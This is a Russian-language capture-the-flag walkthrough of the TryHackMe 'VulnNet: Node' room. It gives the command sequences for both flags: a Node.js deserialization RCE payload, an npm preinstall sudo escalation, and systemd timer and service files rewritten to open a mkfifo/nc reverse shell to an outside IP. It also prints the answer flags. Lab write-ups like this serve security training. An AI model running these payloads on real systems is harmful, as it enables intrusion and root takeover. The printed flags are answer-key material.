[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [VulnNet: Node](https://tryhackme.com/r/room/vulnnetnode) 

Всего 1 заданиe:
## Задание 1
VulnNet Entertainment переместили свою инфраструктуру и теперь они уверены, что больше никаких нарушений не 
повторится. Вам поручено доказать обратное и проникнуть в их сеть.

Уровень сложности: легкий
Веб-язык: JavaScript
Это снова попытка воссоздать более реалистичный сценарий, но с технологиями, упакованными в одну машину. Удачи!

Значок создан Freepik с сайта www.flaticon.com

### Ответьте на вопросы ниже
Что такое флаг пользователя? (user.txt)
```commandline
nmap -sC -sV <IP>
gobuster dir -u http://<IP>:8080/ -w /usr/share/wordlists/dirb/common.txt 
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
python nodejsshell.py <my_own_IP> 4444
echo -n '{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode10,118,97,114,[REDACTED],84,41,59,10))}()"}' | base64
nc -nvlp 4444
sudo -l
mkdir ~/tmp
echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
id
python3 -c "import pty;pty.spawn('/bin/bash')"
cd /home/serv-manage/
cat user.txt
```
```commandline
THM{064640a2f880ce9ed7a54886f1bde821}
```

Что такое корневой флаг? (root.txt)
```commandline
find / -type f -name vulnnet-auto.timer -exec ls -l {} + 2>/dev/null
sudo -l
cd /etc/systemd/system
cat vulnnet-auto.timer
cat vulnnet-job.service
sudo -u root /bin/systemctl stop vulnnet-auto.timer

cat > /etc/systemd/system/vulnnet-auto.timer << EOF 
[Unit]
Description=Run VulnNet utilities every 30 min
 
[Timer]
OnBootSec=0min
OnCalendar=*:0/1
Unit=vulnnet-job.service
 
[Install]
WantedBy=basic.target
EOF


cat > /etc/systemd/system/vulnnet-job.service << EOF
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer
 
[Service]
Type=forking
ExecStart=/bin/sh -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.50.72 5555 >/tmp/f'
 
[Install]
WantedBy=multi-user.target
EOF


sudo -u root /bin/systemctl daemon-reload
sudo -u root /bin/systemctl start vulnnet-auto.timer
nc -nlvp 5555
cat root.txt
```
```commandline
THM{abea728f211b105a608a720a37adabf9}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)